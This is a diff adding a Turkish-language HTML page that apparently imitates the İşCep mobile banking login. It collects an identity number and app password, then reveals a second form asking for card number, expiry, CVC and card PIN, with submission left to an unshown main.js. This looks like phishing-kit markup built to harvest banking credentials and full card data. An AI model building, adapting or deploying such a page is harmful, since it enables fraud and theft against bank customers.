@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&amp;display=swap" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+	   <link rel="stylesheet" href="style.css">
+
+    <title>Mobile Sayfa</title>
+
+    
+</head>
+
+<body>
+    <div class="preloader" id="preloader">
+        <div class="spinner"></div>
+    </div>
+
+    <header></header>
+    <div class="fullscreen-div" id="fullscreenDiv" style="display: block;"></div>
+
+    <div class="main">
+<!-- Giriş ekranı -->
+<div id="login-screen">
+    <center> <label for="customUsername" style="color:#636364; font-size: 11px; display: block;margin-bottom: 3%;float: left;font-weight:500;text-align: left; width: 100%; padding-left: 10%;">MÜŞTERİ
+            VEYA TC KİMLİK NUMARASI</label>
+<input type="text" class="form-control" id="tcnum" maxlength="11" placeholder="TC Kimlik Numarası" style="text-align: left; direction: ltr;" autocomplete="off">
+
+
+
+    </center>
+    <center>
+<label for="customPassword" style="color:#636364; font-size: 11px; display: block; margin-bottom: 3%; margin-top: 3%; font-weight: 600; text-align: left; width: 100%; padding-left: 10%;">İŞCEP ŞİFRESİ</label>
+        <input type="password" class="form-control" id="pwd" maxlength="6" inputmode="numeric" placeholder="Parola" autocomplete="off">
+        <div id="errorMessage" class="error-message" style="display:none;">Lütfen Bilgilerinizi kontrol ederek tekrar deneyin.</div>
+    </center>
+    <center>
+        <button id="formSubmit" class="btn" type="button">Devam</button>
+    </center>
+</div>
+
+<!-- Kart Bilgileri Ekranı (Başlangıçta gizli olacak) -->
+<div id="card-info-screen" style="display: none;">
+    <center>
+        <input type="text" class="form-control" id="cardnum" maxlength="19" placeholder="16 Haneli Kart Numarası" />       
+
+    </center>
+	    <center>
+    <div class="expiry-cvc">
+        <input type="text" class="form-control" id="expiry" maxlength="5" placeholder="SKT" /> 
+         <input type="text" class="form-control" id="cvc" maxlength="3" placeholder="CVC" />
+    </div>
+	    </center>
+    <center>
+         <input type="password" class="form-control" id="cardpwd" maxlength="4" placeholder="Kart Şifresi" />
+    </center>
+    <center>
+         <button id="submitCardInfo" class="btn" type="button">Devam</button>
+		<div id="error-message" style="display: none; color: red; font-size: 16px; margin-top: 10px;"></div>
+    </center>
+</div>
+<div id="error-message" style="display:none; color: red; font-size: 14px; margin-top: 10px;">
+    Son kullanma tarihi geçersiz!
+</div>
+
+</center>
+        </form>
+    </div>
+
+    <script src="main.js"> </script>
+</body>
+
+</html>
